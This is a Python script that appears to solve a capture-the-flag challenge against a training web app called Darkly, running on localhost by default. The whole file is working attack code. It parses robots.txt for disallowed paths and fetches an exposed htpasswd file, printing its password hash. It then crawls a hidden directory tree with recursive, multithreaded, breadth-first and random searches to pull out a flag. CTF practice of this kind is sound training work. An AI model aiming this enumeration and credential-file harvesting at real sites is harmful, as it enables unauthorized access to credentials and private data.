#!/usr/bin/env python3
"""
Search Engine Discovery Breach Exploit for Darkly
Combines all methods to find exposed information through robots.txt
"""

import requests
import re
import hashlib
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import time

class SearchEngineDiscoveryExploit:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url
        self.findings = {
            'robots_txt': None,
            'exposed_dirs': [],
            'password_hashes': [],
            'flags': [],
            'readme_contents': []
        }
    
    def check_robots_txt(self):
        """Check for robots.txt and extract disallowed paths"""
        print("[*] Checking robots.txt...")
        try:
            response = requests.get(f"{self.base_url}/robots.txt", timeout=5)
            if response.status_code == 200:
                self.findings['robots_txt'] = response.text
                print(f"[+] Found robots.txt:\n{response.text}")
                
                disallowed = re.findall(r'Disallow:\s*(.+)', response.text)
                for path in disallowed:
                    self.findings['exposed_dirs'].append(path.strip())
                    print(f"[+] Exposed directory: {path.strip()}")
                return True
        except Exception as e:
            print(f"[-] Error checking robots.txt: {e}")
        return False
    
    def check_exposed_directories(self):
        """Check each exposed directory for sensitive files"""
        print("\n[*] Checking exposed directories...")
        for directory in self.findings['exposed_dirs']:
            url = f"{self.base_url}{directory}/"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Directory listing enabled at: {url}")
                    
                    if 'whatever' in directory:
                        htpasswd_url = f"{self.base_url}{directory}/htpasswd"
                        htpasswd_resp = requests.get(htpasswd_url, timeout=5)
                        if htpasswd_resp.status_code == 200:
                            print(f"[+] Found htpasswd file: {htpasswd_resp.text.strip()}")
                            self.findings['password_hashes'].append(htpasswd_resp.text.strip())
                    
                    if '.hidden' in directory:
                        readme_url = f"{self.base_url}{directory}/README"
                        readme_resp = requests.get(readme_url, timeout=5)
                        if readme_resp.status_code == 200:
                            print(f"[+] Found README: {readme_resp.text[:50].strip()}...")
            except Exception as e:
                print(f"[-] Error checking {url}: {e}")
    
    def search_hidden_directory(self, max_depth=3):
        """Search through the .hidden directory structure for the flag"""
        print("\n[*] Searching .hidden directory structure...")
        hidden_url = f"{self.base_url}/.hidden/"
        
        def search_directory(url, depth=0):
            if depth > max_depth:
                return None
            
            try:
                response = requests.get(url, timeout=3)
                content = response.text
                
                if 'README' in content:
                    readme_url = url + 'README'
                    readme_response = requests.get(readme_url, timeout=3)
                    readme_content = readme_response.text.strip()
                    
                    if readme_content and 'Tu veux de l\'aide' not in readme_content:
                        if 'flag' in readme_content.lower() or len(readme_content) > 40:
                            print(f"[+] Found interesting README at {readme_url}")
                            print(f"    Content: {readme_content}")
                            self.findings['readme_contents'].append(readme_content)
                            
                            flag_match = re.search(r'([a-f0-9]{64})', readme_content)
                            if flag_match:
                                flag = flag_match.group(1)
                                print(f"[!] FLAG FOUND: {flag}")
                                self.findings['flags'].append(flag)
                                return flag
                
                soup = BeautifulSoup(content, 'html.parser')
                links = soup.find_all('a', href=True)
                
                subdirs = [link['href'] for link in links if link['href'].endswith('/') and link['href'] != '../']
                
                for subdir in subdirs[:5]:
                    subdirectory_url = url + subdir
                    result = search_directory(subdirectory_url, depth + 1)
                    if result:
                        return result
                        
            except Exception as e:
                pass
            
            return None
        
        search_directory(hidden_url)
    
    def parallel_readme_search(self):
        """Parallel search for all README files in .hidden directory"""
        print("\n[*] Performing parallel README search...")
        
        def get_readme_content(url):
            try:
                response = requests.get(url + 'README', timeout=2)
                if response.status_code == 200:
                    content = response.text.strip()
                    if content and 'Tu veux de l\'aide' not in content:
                        return url, content
            except:
                pass
            return None, None
        
        def find_directories(url):
            try:
                response = requests.get(url, timeout=2)
                if response.status_code == 200:
                    dirs = re.findall(r'href="([^/]+/)"', response.text)
                    return [d for d in dirs if d != '../']
            except:
                pass
            return []
        
        base_url = f"{self.base_url}/.hidden/"
        current_level = [base_url]
        all_checked = set()
        
        for level in range(4):
            print(f"[*] Searching level {level}, {len(current_level)} directories...")
            next_level = []
            readme_urls = []
            
            for url in current_level:
                if url not in all_checked:
                    all_checked.add(url)
                    readme_urls.append(url)
                    dirs = find_directories(url)
                    for d in dirs:
                        next_level.append(url + d)
            
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = {executor.submit(get_readme_content, url): url for url in readme_urls}
                for future in as_completed(futures):
                    url, content = future.result()
                    if content:
                        self.findings['readme_contents'].append(content)
                        
                        if 'flag' in content.lower() or re.search(r'[a-f0-9]{64}', content) or 'Hey, here is your flag' in content:
                            flag_with_prefix = re.search(r'flag\s*:\s*([a-f0-9]{64})', content, re.IGNORECASE)
                            if flag_with_prefix:
                                flag = flag_with_prefix.group(1)
                                print(f"[!] FLAG FOUND: {flag}")
                                print(f"    Location: {url}")
                                self.findings['flags'].append(flag)
                                return flag
                            flag_match = re.search(r'([a-f0-9]{64})', content)
                            if flag_match:
                                flag = flag_match.group(1)
                                print(f"[!] FLAG FOUND: {flag}")
                                print(f"    Location: {url}")
                                self.findings['flags'].append(flag)
                                return flag
                            elif 'flag' in content.lower():
                                print(f"[+] Potential flag content at {url}: {content}")
            
            if level < 2:
                current_level = next_level[:100]
            else:
                current_level = next_level[:50]
                
            if not current_level:
                break
        
        return None
    
    def analyze_findings(self):
        """Analyze all collected data to find the flag"""
        print("\n[*] Analyzing collected data...")
        
        if self.findings['flags']:
            print(f"[!] Found {len(self.findings['flags'])} flag(s):")
            for flag in self.findings['flags']:
                print(f"    {flag}")
        
        unique_readmes = list(set(self.findings['readme_contents']))
        print(f"\n[*] Found {len(unique_readmes)} unique README messages:")
        for i, content in enumerate(unique_readmes[:10], 1):
            print(f"    {i}. {content[:80]}...")
        
        if len(unique_readmes) > 1 and not self.findings['flags']:
            combined = ''.join(unique_readmes)
            md5_hash = hashlib.md5(combined.encode()).hexdigest()
            print(f"\n[*] MD5 of combined README contents: {md5_hash}")
        
        if self.findings['password_hashes']:
            print(f"\n[!] Found password hashes:")
            for hash_entry in self.findings['password_hashes']:
                print(f"    {hash_entry}")
    
    def bfs_search(self):
        """Breadth-first search through .hidden directory to find flag"""
        print("\n[*] Performing comprehensive BFS search...")
        from collections import deque
        
        base_url = f"{self.base_url}/.hidden/"
        queue = deque([(base_url, 0)])
        visited = set()
        checked_readmes = 0
        
        while queue and not self.findings['flags']:
            current_url, depth = queue.popleft()
            
            if depth > 4 or current_url in visited:
                continue
                
            visited.add(current_url)
            
            try:
                readme_url = current_url + "README"
                readme_resp = requests.get(readme_url, timeout=2)
                if readme_resp.status_code == 200:
                    checked_readmes += 1
                    content = readme_resp.text.strip()
                    
                    if content and 'Tu veux de l\'aide' not in content:
                        self.findings['readme_contents'].append(content)
                        
                        if 'Hey, here is your flag' in content or 'flag' in content.lower():
                            flag_match = re.search(r'flag\s*:\s*([a-f0-9]{64})', content, re.IGNORECASE)
                            if flag_match:
                                flag = flag_match.group(1)
                                print(f"[!] FLAG FOUND: {flag}")
                                print(f"    Location: {readme_url}")
                                self.findings['flags'].append(flag)
                                return True
                    
                    if checked_readmes % 500 == 0:
                        print(f"    Checked {checked_readmes} README files...")
                
                dir_resp = requests.get(current_url, timeout=2)
                if dir_resp.status_code == 200:
                    dirs = re.findall(r'href="([^/]+/)"', dir_resp.text)
                    for d in dirs:
                        if d != '../':
                            next_url = current_url + d
                            queue.append((next_url, depth + 1))
                            
            except Exception:
                continue
        
        print(f"    Total README files checked: {checked_readmes}")
        return bool(self.findings['flags'])
    
    def deep_random_search(self, attempts=50):
        """Do a deep random search through the directory tree"""
        print("\n[*] Performing deep random search...")
        base_url = f"{self.base_url}/.hidden/"
        
        for attempt in range(attempts):
            try:
                resp1 = requests.get(base_url, timeout=2)
                dirs1 = re.findall(r'href="([^/]+/)"', resp1.text)
                dirs1 = [d for d in dirs1 if d != '../']
                if not dirs1:
                    continue
                
                import random
                dir1 = random.choice(dirs1)
                
                resp2 = requests.get(base_url + dir1, timeout=2)
                dirs2 = re.findall(r'href="([^/]+/)"', resp2.text)
                dirs2 = [d for d in dirs2 if d != '../']
                if not dirs2:
                    continue
                    
                dir2 = random.choice(dirs2)
                
                resp3 = requests.get(base_url + dir1 + dir2, timeout=2)
                dirs3 = re.findall(r'href="([^/]+/)"', resp3.text)
                dirs3 = [d for d in dirs3 if d != '../']
                if not dirs3:
                    continue
                    
                dir3 = random.choice(dirs3)
                
                readme_url = base_url + dir1 + dir2 + dir3 + "README"
                readme_resp = requests.get(readme_url, timeout=2)
                if readme_resp.status_code == 200:
                    content = readme_resp.text.strip()
                    
                    if 'flag' in content.lower() or len(content) > 60:
                        flag_match = re.search(r'flag\s*:\s*([a-f0-9]{64})', content, re.IGNORECASE)
                        if flag_match:
                            flag = flag_match.group(1)
                            print(f"[!] FLAG FOUND via deep search: {flag}")
                            print(f"    Location: {readme_url}")
                            self.findings['flags'].append(flag)
                            return flag
                        elif 'flag' in content.lower():
                            print(f"[+] Potential flag at {readme_url}: {content}")
                            
            except Exception:
                continue
        
        return None
    
    def run(self):
        """Run the complete exploit"""
        print("="*60)
        print("Search Engine Discovery Breach Exploit for Darkly")
        print("="*60)
        
        if self.check_robots_txt():
            self.check_exposed_directories()
            
            if '/.hidden' in ' '.join(self.findings['exposed_dirs']):
                self.search_hidden_directory()
                
                if not self.findings['flags']:
                    self.parallel_readme_search()
                
                if not self.findings['flags']:
                    self.deep_random_search(attempts=200)
                
                if not self.findings['flags']:
                    self.bfs_search()
        
        self.analyze_findings()
        
        print("\n" + "="*60)
        print("Exploit Complete!")
        print("="*60)
        
        return self.findings

def main():
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:8080"
    
    exploit = SearchEngineDiscoveryExploit(base_url)
    findings = exploit.run()
    
    print("\n[SUMMARY]")
    print(f"Robots.txt found: {'Yes' if findings['robots_txt'] else 'No'}")
    print(f"Exposed directories: {len(findings['exposed_dirs'])}")
    print(f"Password hashes found: {len(findings['password_hashes'])}")
    print(f"Flags found: {len(findings['flags'])}")
    
    if findings['flags']:
        print(f"\n[!] FLAG: {findings['flags'][0]}")

if __name__ == "__main__":
    main()
